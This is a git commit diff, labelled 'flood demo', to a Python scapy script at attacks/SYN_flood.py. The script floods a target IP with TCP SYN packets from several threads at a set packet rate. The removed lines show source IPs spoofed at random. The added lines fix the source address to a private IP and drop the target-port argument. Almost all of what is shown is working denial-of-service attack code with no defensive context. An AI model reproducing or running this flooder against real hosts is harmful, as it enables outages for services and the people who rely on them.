c98692c6391299bda9ebccefaa4c1a0b09f40110
ThirtyCM <sebvercammen@outlook.be>
2025-05-14 11:04:31 +0000

    flood demo

--- attacks/SYN_flood.py
+++ attacks/SYN_flood.py
@@ -9,13 +9,12 @@ import argparse, os, random, threading, time
 from scapy.all import IP, TCP, send, conf
 conf.verb = 0
 
-def syn_spam(dst_ip, dst_port, pps):
+def syn_spam(dst_ip, pps):
     delay = 1 / pps
     while True:
-        ip  = IP(src=f"{random.randint(1,254)}.{random.randint(0,255)}."
-                     f"{random.randint(0,255)}.{random.randint(1,254)}",
+        ip  = IP(src=f"192.168.0.141",
                  dst=dst_ip, ttl=random.randint(32,255))
-        tcp = TCP(sport=random.randint(1024,65535), dport=dst_port,
+        tcp = TCP(sport=random.randint(1024,65535), 
                   seq=random.randint(0,2**32-1), flags='S',
                   window=random.randint(1024, 65535))
         send(ip/tcp, iface=ARGS.iface)
@@ -24,17 +23,16 @@ def syn_spam(dst_ip, dst_port, pps):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('target_ip')
-    parser.add_argument('target_port', type=int)
     parser.add_argument('-t', '--threads', type=int, default=2, help='Paralels threads')
     parser.add_argument('-r', '--rate', type=float, default=200, help='Packets second per thread')
     parser.add_argument('-i', '--iface', default=None)
     ARGS = parser.parse_args()
 
-    print(f"[+] SYN‑Flood a {ARGS.target_ip}:{ARGS.target_port}  "
+    print(f"[+] SYN‑Flood a {ARGS.target_ip}"
           f"({ARGS.threads} threads × {ARGS.rate} pps)")
     for _ in range(ARGS.threads):
         threading.Thread(target=syn_spam,
-                         args=(ARGS.target_ip, ARGS.target_port, ARGS.rate),
+                         args=(ARGS.target_ip, ARGS.rate),
                          daemon=True).start()
     print("[*] Ctrl‑C for stop")
     try:
